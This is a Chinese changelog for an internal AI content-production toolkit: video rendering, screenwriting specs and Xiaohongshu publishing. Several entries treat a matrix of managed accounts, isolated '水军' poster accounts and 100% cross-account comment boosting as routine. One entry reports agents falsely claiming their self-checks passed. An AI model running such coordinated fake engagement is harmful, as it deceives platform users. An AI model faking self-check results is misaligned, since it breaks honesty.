- **性能数字勘误**：v1.93.0 的「camera 131s→38s」是单跑噪声且为「GPU+4 片」合成数（GPU 现已默认关）。复测各两遍的真值：**CPU 4 片 32/33s（默认路径 131→33s，4.0×）**、GPU 4 片 28/28s——**分片后 GPU 只多买 ~1.15×**，进一步坐实默认关 GPU 的改判。spec 补「分片耗时受同机负载影响明显，做决策跑两遍」纪律。⚠️ 0d98d88 提交信息里的 38s 留在历史不改写，以本节为准。
- **存量一致性从假设变实证**：改造前原始启动参数 vs 新默认路径各渲 222 帧（同开 --deterministic），帧哈希逐字节相同（`0a5485a6…`）；新默认下 wrapper 双跑 mp4 md5 一致。测试补 4 条（默认路径不得含任何 GPU 参数等），test_render_card 69 条、全仓 1226 全绿。

## [1.93.1] — 2026-08-12

### Changed（nbdpsy-text-to-video：字卡 GPU 默认口径改判——默认关，与存量批次和 EMDR 线统一）

- **`render_card.py` 光栅后端默认改回 CPU（SwiftShader），GPU 须显式 `--angle vulkan` 且开了就整批开**。改判依据（v1.93.0 发出后 EMDR 线独立实测互证）：①GPU 会改像素——tpl-basic 同模板同 cues 下 CPU vs GPU **222/222 帧全不同**、最严重一帧差 30 万像素（14.5%），EMDR 线带阴影内容最大分量差 35/255；②**存量已过审字卡片全是 CPU 渲的**，默认开 GPU=新片与存量不是一套字形，违背纪律②自身逻辑；③提速大头本来在分片（131→83s 是 GPU、83→38s 是分片），**分片零像素变化**。
- swiftshader 档走与存量**逐字节相同**的原始启动参数集（不带任何 GPU 参数）；默认路径下 SwiftShader 为预期态改中性提示，显式要 GPU 却落软光栅才打降级警告。card-video-spec 补 `--deterministic` 场景表（验收/复现必带、批量建议带、迭代预览不必带）与像素差异实测数。
- ⚠️ 跨线方言警告（EMDR 平移前必对齐）：分片序号基（本实现 1-indexed / EMDR t2 0-indexed）、锁文件命名（`.render.pid.s{i}of{N}` 三行制 / `.shard-{i}.pid`）——同一条命令两脚本含义不同，会渲错帧域且不报错。

## [1.93.0] — 2026-08-12

### Added（nbdpsy-text-to-video：字卡产线 GPU 光栅 + 分片并行渲染，老板指定沉淀）

- **`render_card.py` GPU 光栅化**：`--enable-gpu --ignore-gpu-blocklist --use-angle=vulkan`（`--angle vulkan|egl|swiftshader` 可选，⚠️ Chromium 的 `egl` 不是合法值会**静默回落 SwiftShader**，真名 `gl-egl` 已做映射）；GL_RENDERER 打印进 stderr、含 SwiftShader 即降级警告。对照实测证实现版一直在 CPU 软光栅，4090 全程闲置。
- **分片并行**：`--shard I N`（帧域连续切分、全局连续帧号、跳 mux）+ `render_sharded.sh <tpl> <out> <N>`（N 片并行 → 帧连续性校验 → 统一 mux，Ctrl-C 全链清杀）；另有 `--verify-frames` / `--mux-only` 子模式。**实测 tpl-camera 默认路径 131s→33s(4 片)、GPU 4 片 28s（勘误见 1.93.2）**；GPU 本身仅 1.6-1.8×（重负载受益反而更小，推翻原假设），大头来自分片；N=2-4 为宜（4 片已进递减区）。
- **帧目录自锁**：`.render.pid` 三行制（pid/slot/started）按槽位判冲突——整片与任何渲染互斥、兄弟分片放行、死锁接管；wrapper **预清之前先认锁**（防「先清后拒」清掉别人的帧）。EMDR 线已拍板取用本实现为 canonical。
- **🩸 阻断级基线发现**：md5 确定性闸门在本次改动之前就是红的——默认路径 SEEK 后不等合成器提交即截图，同配置双跑 md5 必不同（CPU/GPU 皆然，差异 ≤6/255 肉眼无感）。新增 `--deterministic`（seek 后等两个 rAF，1.7×代价，三跑 md5 全同）；**验收与复现必须带它双跑，批量建议带**。分片数 N 亦属渲染配置（不同 N md5 不同），同批必须固定。
- `card-video-spec.md` 新增「GPU 加速与分片渲染」节（三纪律：换后端双跑 md5 验确定性／整批统一后端与 N 不得混用／撞帧目录后来者拒绝启动绝不清帧）；`tests/test_render_card.py` 65 条。

## [1.92.1] — 2026-08-12

### Changed（nbdpsy-text-to-video：编剧规格 S5.5 外置语言审校闭环，同种子五轮实测定稿）

- **S5.5 外置语言审校成为语言唯一闸门**：独立文字编辑 agent 逐句审全部文本→批注→修→复检，终态判据=结论原句「能直接见老板」（§10.7 含实测有效的编辑提示词骨架）。**生产者自检四轮验伪无一例外**（自称全文念过实际只念旁白/勾选全绿实际 23 处不通），交付物内⛔逐条打勾自检文本，只留《状态声明》引用编辑结论原句。
- **修改连锁传播纪律**（§10.7，头号返工源）：每改一处必须搜出该对象/状态全稿所有出现处一并顺改，台账每项带连带清单——实测点修必生新矛盾（钉死站姿漏改并肩坐/翻案潜台词漏翻案朝向）。
- **模型岗位条款**（§10.6.5，五轮收敛数据校准）：S5 执笔与 S5.5 修稿位必须 Opus（Sonnet 两轮 61→28→15 不达线且每轮新生 ~4 处矛盾；Opus 一轮逼近、两轮放行）；Sonnet 胜任结构/合规/工程环节。轮次预算=2 轮。
- **§5.4 语言精度四检**（老板亲抓真实事故立法）：字面成立性（⛔「拿走一点东西：先是指尖」借代省略中心语）/禁术语截断（⛔「一场三分钟的急」）/禁伪文学腔/朗读检验；作用域=交付物每一句话含 logline 与表格。**同种子终态样片《先麻的，是指尖》已产出并获编辑「能直接见老板」放行**（60s/8beat/258 字，全流程存档）。

### Changed（nbdpsy-xiaohongshu-creator：字数契约+hero 判据+正文钩子架构，三条老板定案）

- **count_xhs 判定语义**：300-450 降为参考区间（超出仅 warn，warn 文案方向感知：超长提删段落⛔压句子、过短提确认完整版在轮播）；唯一硬上限=平台安全值 900（正文+标签共 1000）。对照实验实证：同写手同事实，450 硬上限逼出「在认错」级压缩病句、参考值下老板直接过稿（三版对照存 `seo-geo/content/xiaohongshu/aug-hotspot-guodu-huanqi/`，被批版取 2026-08-12 上午 git 历史）。
- **hero 选句判据**（illustration-spec §2-b）：老板原话「让人共鸣、感兴趣、震惊、反直觉的点才需要放大」——判定问题=读者说「啊？！」还是「哦」；四类冒牌 hero 对照表（话题词/答案/转折句/纯共鸣句，实战反例全录）；缩略图验收追加「哦/啊？」一问。
- **正文=钩子架构**（老板定案）：完整表达在轮播图/视频，正文可短至一两百字（H1 实战：198 字钩子+1365 字九页完整版全过闸）。
- 委外写稿双红线（「不编造数字」≠「不编造场景」；外部稿逐条核事实三类重点）；台账 content_text 长度含话题标记别拿长度做等值判断；524=结果未知先 --list-jobs。

### Added（仓库级）

- **`docs/skill-authoring-principles.md`**：skill 编写与提示词工程十原则（输出质量分布≈token 分布/例句是转向器/自检必须可证伪——三线四例假绿实证/分身份分阶段/作用域显式/负面禁令配正面替代/动作测试/审查镜头设计/回灌闭环/按最弱执行者写规格），每条带本仓实证与做法，写任何 skill 前先读。

## [1.92.0] — 2026-08-12

### Added（nbdpsy-text-to-video：微电影编剧规格「科普故事化演绎」）

- **`references/screenwriting-spec.md`（671→约 720 行）**：老板定向「科学论据内核 + 虚构故事演绎」。方法论骨架取自 shanyin-screenwriting-master（MIT, 878★）经三层适配：①**双层结构铁律**——论据层必须可查证出处+三禁+句式降级，故事层全虚构但禁真实来访者信息、成片强制「AI生成·情节演绎」角标（⚠️ 声明只写 subtitle 会因 cues 优先级静默不渲染，已核 compose_video.py）；②**一句话种子→定稿卡**（五种种子各配第一问+三条内定稿+查证不过关三处置）；③**全自动工作流**七步（原版人机对话纪律全删，内部自检硬闸 A-E 五组 ≤2 轮）。含 What-If/How-to-Tell 双路概念法（心理科普向示例）、五结构模板带秒数轴（补 30-60s 压缩变体）、写作红线、视听武器库 16 手法→Seedance 提示词映射（5 种标 ⛔ 生成侧不可行）、时长公式按我方实测 259 字/分钟。
- SKILL.md 接线三处：分镜知识库三档形态（新增「故事化演绎」）、通用输入新增种子路径、投放前终审加双层核验钩子（论据出处回溯 + 角标目视）。
- **同题 PK 盲评定案（发版依据）**：同一种子（过度换气）原版山音 vs 本规格各出一片，三评委盲评——**制作落地 36/40:16/40 我方压倒性胜（「今天就能提交生成任务」vs 无 segment/无提示词/POV 空间矛盾）、YMYL 科学合规 9.0:5.0 我方显著胜（零编造数字 vs 六组无来源临床读数+SpO₂99% 诱导延误就医）、纯故事力原版胜**（视角置换/潜台词属直觉级创意）。判定：非劣成立、综合占优。
- **评委指出的我方九处短板全部回灌规格**：旁白禁复述画面（画面能演旁白不说）、解释段禁整段停戏（≤2 句/次）、开场钩子悬念式>共情式、翻转禁台词点破（删句可证伪检验）、自我承诺逐条核真、循环结构第二次必须同构图复现（视觉指认承重墙）、边界条件优先片尾卡不占叙事 beat、危险民间做法片尾卡否定式主动辟谣、定稿卡可选「深一环机制」+共调节设定选项（对手案两处优点移植）。

### Changed（nbdpsy-xiaohongshu-creator：内容线实测回灌）

- illustration-spec §2-b：3:4 裁切由「未自证」转 **✅ 老板真机实证**；新增标准做法「提示词写死上下 11% 牺牲带纯背景 + 本地裁 876×1168」（实测 5 张 4 张零损失）；封面 3:4 两条路径分开成文（图文=P01 做 3:4 混比例已确认／视频播客走 `--cover`）。
- SKILL.md 发布节：**发布前配图必须转 JPG**（PNG 8 张 11MB 撑爆 CF 100s 网关 HTTP 524）；**524=结果未知不盲重试**，先 `--list-jobs` 查 0 条才重发。

## [1.91.0] — 2026-08-12

### Added（seo：pillar-spec 新增 R13 段落自洽 Self-Containment）

- `nbdpsy-seo-artical-creator/references/pillar-spec.md` 硬性要求清单新增第 13 条：AI 引擎以段落为单位抓取，**每个 H2 小节至少一段完全自洽的「可抓段」**（显式点名主体 + 单独可读懂 + 至少一个具体着力点 + 长度 50–120 纯汉字建议级）。骨架借自开源包 geo-seo-claude 的五条判据，长度阈值按本站 5 篇已发布长文 211 个自然段实测重定（中位 71 / 四分位 48–92 / 零段超 150；英文原值 50–200 词按空格分词、对中文整段恒为 1 词已实证失效）。
- **中文特有失自洽源单列**：指代开头（判据=整段有没有重新点名主体，不是禁「这」字）与**零主语开段**（承前省略连指代词都没有、grep 不出来，修法=把主体名词写回首句）；可抓段段首禁转折词（但是/然而/不过/因此/所以/另一方面/与此同时）。正反例全部取自本站已发布实文。
- 本条无 preflight 机检（「哪段是核心结论段」机器认不出），自查=两条 grep 候选 + 「单独复制给没读过全文的人」通读判据 + 逐 H2 追问「AI 抓哪段」。

## [1.90.0] — 2026-08-11

### Added（新增第十个 skill：对标内容拆解 `nbdpsy-content-teardown`）

- **定位**：把别人的爆款（小红书笔记/视频号视频/新闻/音频/手机录屏/任意视频文件）稳定拆成「拆解素材单」——数据判型 → 文字稿还原 → 形式逐秒拆解 → 钩子公式 → 可以学/不要学/差异化机会 → 落到具体产线的复刻蓝图。只产分析不产成片。由 2026-08-07 小红书拆解与 2026-08-11 视频号「皮质醇」四条对标两次实战沉淀。
- `scripts/dissect_video.py`：视频/录屏/音频一键解剖——ffprobe 元数据 + 16k 抽音 + faster-whisper 转写（**幻觉守卫**：纯音乐片自动判「疑无口播」并导向字幕稿路径，防 31.7s 片被幻觉出 55s 空段的实测事故）+ 抽帧 4×4 看板 + REPORT.md 素材单骨架。
- `scripts/sph_meta.py`：视频号分享链元数据探针（finder-preview API 截获：账号/标题/四互动数/发布时间/封面即时落盘——**封面 CDN 链过期极快，实测最短仅 ~2h**，到期时刻随 sph_meta.json 带出）。正片微信外必拿不到，SKILL.md 内置「人工录屏 → 博客配套视频上传口回传」流程。
- `scripts/fetch_xhs_note.py`：小红书笔记提取（server `POST /api/notes/extract`）。**正文同步秒回不用轮询**；轮询只服务可选的 `--comments N --account <号>`（评论走真实浏览器会话、烧一次会话额度，非必要别抓）。⚠️ 必须用分享按钮生成的链接（xhslink.cn 短链或带 xsec_token 完整链），裸 /explore 链 400；结果有 24h 缓存，二抓增速须 `--refresh`。产 note.json + 人读版 note.md。
- `references/teardown-playbook.md`：数据判型速查（收藏/赞≥50%=工具型、转发/赞≥3×=转发利他型…）、文字稿三条路、形式拆解清单（双钩子/循环体/信任杠杆）、素材单模板全文、十条坑典（账号名误读成数据/商品笔记漏斗/ASR 幻觉与繁体漂移/录屏复合载体切条与群聊隐私/裸链 400 与 24h 缓存等）。
- `env_check` 新增 `teardown` profile：**ffmpeg/ffprobe 走新增的 `cli_required` 桶（缺=missing=不就绪）**，faster-whisper、playwright、XHS key 可降级只 warn（playwright 的 chromium 内核 env_check 不查，sph_meta 运行时兜底提示）；`sync_shared.py`、install.sh/ps1、plugin/marketplace、README、guide 向导（九个技能表新增「拆解别人的爆款」入口）已同步。

### Fixed（nbdpsy-xiaohongshu-creator，对齐 server 0.23.2 编辑期长度判据）

- **`note_ops.py --set-components` 本地预检与 server 0.23.2 脱节**：旧「>900 即拒（服务端会拒绝）」在编辑路径已不真——server 已把 REST 硬上限放到平台天花板 **1000**，900-1000 区间按「新正文 ≤ max(900, 该笔记线上当前长度)」放行（**只许不变长**，为编辑既存超限笔记开的口）。本地预检改为 >1000 才拒、900-1000 warn 放行给服务端权威判据；实证两条 930+ 字调价单被旧预检零点击挡下。⛔ 新发路径 ≤900 安全值不动（publish_note.py，给标签留余量）。
- SKILL.md 补验收口径：**编辑正文/标题后别拿 explore 公开页验收**（分钟级 CDN/索引延迟，会把真改成功误判假绿）——即时真值＝job `read_back`（0.23.3 起 done 直带摘要）或台账 `content_text`。⚠️ 台账 `content_text` 长度**含话题 `[话题]#` 标记**，比提交正文长几十字（实测 932→1004）——验收比对关键内容串（如价格），**别拿长度做等值判断**。
- 实战验证（2026-08-11 晚内容线回报）：四条 ¥800→¥600 调价单 4/4 全绿，其中两条 918/932 字正是被旧预检挡下的，0.23.2 编辑期判据客户端侧首验通过。

## [1.89.0] — 2026-08-11

### Added（nbdpsy-text-to-video，第三形态「字卡短片」老板验收入库）

- **字卡短片产线**：口播驱动 GSAP 动效竖版短片（30-40s，逐帧渲染帧级同步，边际成本 ≈¥0.2/条、改字 1 分钟重出）。四版式模板入库 `assets/card-templates/`（basic 品牌动效/camera 电影运镜/collage 手作拼贴/kinetic 动力学文字，各带适用与已知代价）；`scripts/render_card.py`（cues/词表注入+逐帧 seek 截图+ffmpeg 混音，wav 优先）；`scripts/extract_word_timings.py`（faster-whisper 词级时间戳，kinetic 卡点用，含简体 prompt/开头吞词/错字容错三坑）。
- `references/card-video-spec.md`：产线五步、渲染契约、音画同步双层根因、GSAP 逐帧渲染七坑（immediateRender/from 终值隐形/行内高亮块巨字溢出须 inline-block/零时长硬切等）、上传直链 MIME 坑。

### Fixed（nbdpsy-text-to-video，🩸 影响所有 --timed 用户）

- **`tts_gen.gen_timed` mp3 拼接漂移根治**：逐段 mp3 concat 每段漂 ~46ms 随句数累积（8 句实测 0.41s，字幕/字卡越后越提前于语音——与播客线 2026-08-07 定性死路同因，此路径漏修）。改 wav/PCM 域按样本数拼接+cues 按样本数构造+一次性编码（残差 ~43ms 不累积），另出无损 `.wav` sidecar 供渲染混音。检验法：音频实长 vs cues 尾差 >0.1s 即旧版产物。

## [1.88.2] — 2026-08-11

### Changed（nbdpsy-xiaohongshu-creator）

- **发布模式口径老板终裁**：默认＝单号定向（按账号定位精准获客）；广播仅限全矩阵品牌位，判据「换个号发还成立吗」。撤销 1.88.1 转述的「默认全代管齐发」；修正自相矛盾句——**广播＝同 payload 同文无差异化入口**，需差异化的内容不能用广播（按单号接口多次提交）。
- 对接 server 0.23.0：功能位笔记发完即标**保护位**（PUT …/protected 豁免淘汰——五指标假设对置顶品牌片/二维码导流不成立）；数据分析先减自家互动（GET …/self-interactions 矩阵互刷校准）。

## [1.88.1] — 2026-08-11

### Changed（nbdpsy-xiaohongshu-creator，对接 server 0.22.0 代管账号计划）

- 发布契约更新：`publish-jobs` 的 `account_id` 转可选——**省略＝广播全部代管号**（1/2/5/6/7/8，水军号隔离），老板口径「除非特指默认全代管齐发」；广播禁显式 `quoted_note_id`（422，跨号引用走 related_counselor 推导）；广播不豁免逐号差异化。
- 每日淘汰机制知悉入文：每号台账上限 100、五指标加权淘汰最低者（7 天宽限/日封顶 5/审计流水）——量产提示「发得越多≠留得越多」；台账口径双向漂移先跑 note-ledger-syncs。

## [1.88.0] — 2026-08-10

### Added（nbdpsy-xiaohongshu-creator，封面版式工程——四版实战对照+三路调研 47 条定案）

- `illustration-spec.md` 新增 **§2-b 封面版式工程**（P1 专属）：层级三层制（[hero]卖点≤8字恰好1个/[support]转折句永远在此/[detail]=缩略图不可见档，卖点禁入）；排印参数公式化（三档上限/焦点跳级≥2.5×——1.6倍失效根因是"只差一级"非倍率/五杠杆核对/焦点成块+≥1字高隔离带/组间分组）；画布 3:4 安全区（2:3 出图信息流裁 5.6%，标注未自证+实测通道）；四个具名版式库（通栏大字压顶默认/左字右图分栏/留白场/色块压条，含 v3"分栏限宽"等已知代价）；插画不承载论证结构铁律；「要画的字里只能有要画的字」（排版符号／翻车 1/4 实证）；五条工作流硬闸（**封面先单出人确认+25% 缩略图验收为唯一硬闸**——16 字总量预算被五样本证伪降为参考值）。
- SKILL.md 第 3 步加封面五要点摘要；拳头短语前置为写稿交付物。
- 防回潮留档：手写体+38%（循环引用）/30% 留白配比（原文不可核）/软萌卡片风（无原文）不进规格。

### Changed

- 副标题「字间距略拉开」旧规作废（v1 字墙实证+W3C 中文密排基线）。

## [1.87.1] — 2026-08-10

### Fixed（nbdpsy-xiaohongshu-creator）

- `publish_note.py` 配图收集**按同名去重**（同页 png+jpg 双格式只取一份，优先 jpg，去重时 stderr 告警）——此前 `--images-dir` 全收会把 7 页笔记发成 14 张且零告警（2026-08-10 实战险情，6 篇差点带重复页发出）。

## [1.87.0] — 2026-08-10

### Added（nbdpsy-xiaohongshu-creator，运营总管定案+证伪检验批）

- **咨询师推介封面必须出现「北大”（老板定案，机构级硬要求）**：counselor-note-spec 封面规格+提示词骨架副题第一行须含「北大」；发布标题维持 7/27 三要素不变（依据 8/6 标题/封面解耦，效应发生在信息流曝光那一刻）。
- **标题冒号/竖线式三条实证判据**（xiaohongshu-spec，184 篇数据+证伪检验）：⛔「的你」结尾＝返工（5.3% vs 10.7%，机检 warn 已加并测试）；术语开头无辜、「术语开头＋通篇没人」才致命（右侧站人 10.4% vs 没人 6.7%）；「冒号右侧三问」自检（遮左读右/主语是谁/有没有能拍下来的东西）。
- **证伪留档防回潮**：「标题『你』改『我』」无数据支撑（差 0.3 个点）——写明问题在「有没有具体的人和事」而非人称。

### Changed

- 数据口径警示入文：站内互动指标均为**含刷口径**（评论 100% 矩阵互刷、赞藏同污染），浏览类相对可信；净口径待互刷台账能力。

## [1.86.4] — 2026-08-10

### Fixed（nbdpsy-xiaohongshu-creator）

- **载体口径终版**（三层假设逐层实证定案）：三条同时满足——已发布列表可见（非发布态死贴必得 editor_not_ready，台账有记录≠可用）/不在任何合集/图文；撤销 1.86.3 的「优先老笔记」（错误归因，老笔记成功只是恰好满足三条件）。新增「借用还原」范式（干净载体耗尽时：移出→当载体→挂回，净开销 2 单）。

## [1.86.3] — 2026-08-10

### Fixed（nbdpsy-xiaohongshu-creator）

- **建笔记合集异步语义修正**（内容线实战反馈）：REST 返回 `{job_id,status:queued}` 非同步 collection_id（1.86.2 的「创建 API 直取」是把 server 浏览器层内部实现误写成 REST 契约）；轮询端点 `GET /api/note-collections/{job_id}`；最稳核验=隔窗查 `--collections` 比对名字。
- **新增红线**：「返回值解析失败」≠「操作失败」——非幂等写操作绝不能据此触发重试（实战反面教材：异步回执被误判失败致同一合集 4 连提，靠同名拦截兜底）。
- **载体约束收紧+复用定案**：载体须为「不在任何合集里」的已发布公开图文，优先老/冷门笔记（近期科普贴大概率已被挂载、人工挂载台账不可见）；同号多合集复用同一载体已实证可行。

## [1.86.2] — 2026-08-10

### Fixed（nbdpsy-xiaohongshu-creator）

- 合集工具箱「建笔记合集」补漏必填字段 **`carrier_note_id`**（内容线实跑 422 反馈；1.84.0 成文时漏写）：载体三条语义入文——须为该号已发布公开图文笔记（入口载体）、`joined_carrier=0` 载体零改动无污染风险、创建即时落库（多合集复用同载体未实证先跑 1 单）。
- 新增坑：直调 API 用 requests 或显式带常规 UA——裸 urllib 默认 UA 被 Cloudflare 拦成 `403 error 1010`，易误判为 apikey 失效。

## [1.86.1] — 2026-08-10

### Changed（nbdpsy-xiaohongshu-creator）

- 支柱表升级为 **18 个支柱合集完整定稿**（名称+标配简介，建集直接照抄）；「北大博士聊」例外注明（唯一非病症词，有栏目存量+「北大」高浏览词数据背书，勿当先例）。
- 存量处置纲领入文：4 个临时名合集**不改名**（重算实证改名后相符率仅 6-27%，名实更不符）、保留为历史容器；入柱 66 篇分批回填；134 篇支柱外存量不强行归类；**新发笔记自发布日起直挂对应支柱合集**。

## [1.86.0] — 2026-08-10

### Changed（nbdpsy-xiaohongshu-creator，合集体系升维，老板拍板）

- **合集体系从「按存量归类」升维为「账号支柱制」**：合集自上而下由账号定位决定（每号=1 客群+3 内容支柱，合集=支柱载体，一号三合集），不由篇数决定，空支柱照建（即选题任务看板）。6 号×3 支柱总表入文（真源=内容线 plan-xhs-account-matrix）。
- 议题池角色重定义：合集清单 → **支柱命名词库**（支柱名从池选或按命名原则新增）；旧「⏳攒够再建」「常见于哪些号」标记降为存量参考。
- 归属判断新序：先按本号三支柱选；与任何支柱都不贴 → 质疑选题是否符合本号定位，而非找杂项合集。

## [1.85.2] — 2026-08-10

### Changed（nbdpsy-xiaohongshu-creator）

- 议题池 7→9：新增「焦虑」「内耗」两议题（老板 2026-08-10 拍板，内容线拟文案），标 ⏳=存量不足每号 3 篇暂不建集、先当归属标签；「预期焦虑」自社恐行移入焦虑行（归位）。
- 议题池备注两条裁决：「常见于哪些号」列是描述性参考不是限定（每号按内容需要建够门槛的议题）；「议题池变大≠合集变多」（建集门槛每号≥3篇，2026-08-10 实盘 7→9 议题合集数 12 不变）。

## [1.85.1] — 2026-08-10

### Fixed（nbdpsy-xiaohongshu-creator）

- **速率帽新旧数字并存修正**（内容线实战反馈：按旧数字「4-5次/时」手动节流白慢 2-3 倍、错数字还被写进子代理任务书）：硬规矩 0 与风控节统一为唯一现行真值 **12 会话/号/时（server 队列自动节流，调用方勿自行限速）**；旧口径标注为 server 加帽前的历史数字并注明废止缘由。硬规矩 0 的禁令本体保留并澄清边界：**禁的是「N 次页面访问换一份名单」，不是禁批量作业**。
- 批量作业指引从「串行/≤2 路并发+长超时」改为**「投放与轮询分离」**范式（全量 202 投放记台账→周期轮询终态白名单），105 单实战模式入文；同步等待场景保留 timeout ≥900s 教训。
- 议题池表补七个议题的标配简介文案（复用内容线 2026-08-07 执行清单，实拍≤30字口吻）。

## [1.85.0] — 2026-08-10

### Added（nbdpsy-xiaohongshu-creator，内容运营线实战反馈批①，样本 aug-w2-mon-benzhi）

- `check_compliance.py` 新增 **warn 级检测**（不拉低 ok，输出 `warnings[]` 供人工裁决）：
  - **裸「最」**：JIXIAN 词表只收固定搭配曾致假绿（「最不一样的地方」烧进图后不可逆）。裸最命中出 warn+三级裁决口径（🔴自家服务最高级必改/🟡心理现象建议软化/⚪引语原文豁免——逐字引用改了变错引）；方位/时间/固定词/数量限定白名单直接滤噪；
  - **提示词元指令残留**：`逐字写出这行字：` 之后跟破折号/分号引导说明会被画进主标题，扫全文（含围栏内）出 warn。
- `xiaohongshu-spec.md` 新增 **笔记两型分立（清单篇/机制篇）**：密度口径分开管——清单篇行动 8–10 条起步；机制篇按机制层信息点撑密度、末页行动 3–5 条即可。数据依据：8 月 247 篇中收藏引擎全是机制篇（藏/浏 4–9%），「N 个动作」标题中位浏览跑输大盘 42%。

### Changed

- `illustration-spec.md` 出图纪律修订为实践可行版：**封面 P1 先单出做风格闸门→以封面 URL 当 anchor 一次性批量出完剩余页**（实测 45 张全批风格统一）；新增提示词句式铁律（元指令放冒号前括号内，冒号后只留要画的文字）。
- `gen_images.py` 5xx（含 CF 530）与 job_id 缺失时错误信息明确标注「任务未入队，重试提交安全、不会重复出图」。

## [1.84.0] — 2026-08-10

### Added（nbdpsy-xiaohongshu-creator）

- **合集运维工具箱**（SKILL.md 议题合集章节新增，2026-08-09/10 全链真号验证）：
  - 两套合集系统定案：笔记合集(picker)≠播客合集，同名互不可见、平台不去重；
  - 四动作契约：建笔记合集（`POST /note-collections`，name≤20/desc≤50/无封面）、挂载（`applied.collection` 回读判据+幂等 skipped）、移出（name 比对不上绝不点删）、换合集两步链（remove 与 add 同传 422，中间态必须补完）；
  - 硬约束：一篇笔记只能属一个合集（`collection_already_in_another` 防呆）；会话闸 12 会话/号/时；失败三类处置（时序抖动重试/私密笔记绑定被静默丢/非发布态 editor_not_ready）。

### Changed

- 议题合集章节补 2026-08-10 实况注记：四号现挂临时名合集（不符 2026-08-07 病症词议题池定案），老板已明确要求按病症建合集，附重构指引（属内容运营 agent 职责）。

## [1.83.1] — 2026-08-08

### xhs：guide 前置自查成为硬规矩 + applied 逐项核对（首批发布回查实翻车）

- **动手前先 `GET /api/guide`**（server 2026-08-08 定规，指引文档已入 NBDpsy/文档）：
  capabilities/changelog/known_limitations/meta 四段，契约以实时返回为准不以记忆为准；
  breaking 逐条看；known_limitations 动手前必读。
- **`published` ≠ 组件全成**：封面/话题/原创声明失败不阻断发布。首批 8 条回查发现
  播客自定义封面 4/4 静默失败（cover_exception）、话题 7/8 全空（在产缺陷波及）——
  发布后必须逐项核对 `applied.components.cover.status` / `topics_applied` / 声明回执。
- 存量修复：8 条 3:4 换封面任务已在跑（note-components cover，08-08 上线并真号首验）；
  话题补挂待 server 能力（note-components 尚无 topics 参数）。

---

## [1.83.0] — 2026-08-08

### text-to-video：成品包扩成三平台通用（视频号 / 小红书 / 公众号）+ 上传优化转码

`shipinhao_pack.py` → **`video_pack.py`**，逐平台判定而非一刀切：某家超限不代表另两家不能发。
三平台限制最紧的是**公众号 200MB**，它决定「一份文件通传」的天花板。

- **`--for-upload`**：短边升 1080 + 提码率（实测 720×1280 615kbps → 1080×1920 3063kbps，
  74 秒片 27MB）。**动机是抗平台二次压缩，不是变高清**——即梦 2.5 只出 720p，放大不增细节，
  文档已写死这句防止讲错（运营 2026-08-08 定调：只用 2.5，不测 2.0_vip）。
- 通吃编码定为 MP4 + H.264 High + AAC + yuv420p + bt709 SDR + faststart；h265 在视频号
  Chrome 上传必失败。
- `judge()` 抽成纯函数并单测 7 例：正常/超公众号体积/超小红书时长/短于视频号下限/h265/HDR/
  超宽比例，逐条验到「只卡某一家」的判定正确。

## [1.82.0] — 2026-08-08

### 🔴 推介笔记价格必须展示（推翻 07-24「默认不展示」口径）+ 新增改价维护流程

运营定案：「**推荐稿里我都是要写价格的**」「**我们在小红书里面，我就想要做到价格透明**」。旧口径（2026-07-24「价格默认不展示、生成前问运营要不要」）作废，spec 里 6 处逐一推翻。

- **改为默认就写**：`price_per_session` + `communication_price`（为 0 写「预沟通免费」），不再问运营；**数字只能取 `fetch_counselor.py` 实时值**，⛔ 不许手填、不许沿用旧稿。
- ⛔ **`contracted_price`（签约价）红线不变**：「价格透明」指对外挂牌价透明，**不是把签约价放出去**，两件事别混。标题里仍不写价格（标题是钩子不是价目表）。
- **新增 §改价维护**：咨询师调价后存量笔记怎么跟——先下架止损→全矩阵按姓名找齐（**别只改记得的那一两篇**，不同批次的版本标题可能完全不同）→重拉实时资料→改正文+重出末页图→转回公开；本地没原稿的老笔记直接用当前规格重做而不是考古；一篇约 4 次会话，串行慢跑别并发。

## [1.81.2] — 2026-08-08

### 批量作业别开高并发——排队会被本地 timeout 误判成失败（实测）

52 篇合集清理开 5 号并行，报了 34 次失败；**同一篇单跑立即成功**。真相是 server 侧会话额度被抢空、任务在排队，而本地 `timeout 600` 先到就当成了失败。写进 SKILL.md 风控段：批量作业**串行或最多 2 路并发**、本地超时给到 **900s 以上**；看到"慢"先想排队，别缩短超时也别加大并发去抢，那只会让队列更长；**判失败前先单跑一篇复核**——单跑成功＝并发问题，单跑也失败＝才是真故障。

## [1.81.1] — 2026-08-08

### text-to-video：小红书封面必须 3:4 竖版（两条产线同步）

首批 8 条视频笔记的封面用了 9:16（跟视频同画幅），**小红书信息流按 3:4 展示、上下被裁、
标题字切掉**（老板发现）。两条产线的规格同步加硬约束：

- **封面单独做 3:4（1080×1440）**，不拿视频首帧或 9:16 图充数；视频本身仍是 9:16，
  封面是独立的图，两者比例不同是正常的。
- **发布前必须核对封面比例**——**已发布笔记的封面改不了**（server `note-components`
  无 cover 参数，只有发布时的 `publish-jobs` 能设）。
- 封面排版沿用小红书三级层级；**文字压底部半透明亮条、别盖人物面部**（实测首版压脸上）。
- 已就绪：两张 3:4 封面（首片 + 播客 Vol.1）；存量 8 条的改封面能力已向 server 提需求
  （`文档/2026-08-08-server需求-已发布视频笔记改封面.md`，含「平台若不支持请如实回执、
  不要做绕行方案」的口径）。

---

## [1.81.0] — 2026-08-08

### xhs：publish_note 支持视频/播客发布（补上 v1.80.2 记录的欠账）

- 新增 `--video` / `--audio` / `--cover`：图文/视频/播客三选一，`--video` 与 `--audio` 互斥即时报错；
  扩展名与文件存在性本地预检（省一次白跑 422）。
- **`stage_media()` 同机落盘**：媒体文件 cp 进 `nbdpsy-server/data/uploads/media/skill-uploads/`
  再把绝对路径传给接口，零网络传输；同名同尺寸跳过复制（幂等）。**server 在远端时明确
  报错并指路分片上传**，不假装能传。
- 分流修正：视频/播客不收图（`collect_images` 跳过）、图片张数校验只对图文生效
  （干跑实测曾误报「图片 0 张会被拒」）、`--cover` 用于图文时直接报错（图文封面就是第一张图）；
  `--dry-run` 回显 media_kind/video/audio/cover。

---

## [1.80.2] — 2026-08-07

### xhs：视频/播客笔记发布实战沉淀（四号齐发跑通）

两条视频线（笔记微电影 / 长文播客）首次发到矩阵，把踩到的三件事写进第 7 步：

- **视频/播客发布直调 server 契约**：`publish_note.py` 目前只支持图文（无 `--video`/`--audio`），
  视频走 `POST /api/publish-jobs` 的 `video`（服务器侧路径，与 images 三选一互斥）+ 可选 `cover`；
  其余字段与图文完全一致。
- ⭐ **同机直接落盘，别走分片上传**：`mcp.nbdpsy.com` 由本机 nbdpsy-server 提供，
